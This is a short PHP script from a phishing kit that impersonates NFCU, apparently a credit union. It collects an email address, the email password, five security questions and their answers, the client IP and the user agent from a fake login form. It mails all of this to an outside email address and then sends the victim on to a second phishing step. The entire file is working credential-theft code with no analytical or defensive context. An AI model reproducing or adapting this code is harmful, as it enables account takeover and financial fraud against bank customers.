<?php
if($_POST["emlly"] != "" and $_POST["pa77w0rd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-------------NFCU Info-----------------------\n";
$message .= "|Email : ".$_POST['emlly']."\n";
$message .= "|Email Pa33w0rd  : ".$_POST['pa77w0rd']."\n";
$message .= "|question1 : ".$_POST['qa1']."\n";
$message .= "|Answer1 : ".$_POST['an1']."\n";
$message .= "|question2 : ".$_POST['qa2']."\n";
$message .= "|Answer2 : ".$_POST['an2']."\n";
$message .= "|question2 : ".$_POST['qa3']."\n";
$message .= "|Answer3 : ".$_POST['an3']."\n";
$message .= "|question4 : ".$_POST['qa4']."\n";
$message .= "|Answer4 : ".$_POST['an4']."\n";
$message .= "|question5 : ".$_POST['qa5']."\n";
$message .= "|Answer5 : ".$_POST['na5']."\n";
$message .= "-------------created by DC-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "contact.james@tnsshopperaustralia.com";
$subject = "Result from NFCU | $ip";
{
mail("$send", "$subject", $message);   
}

$praga=rand();
$praga=md5($praga);
  header ("Location: step2.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
 


 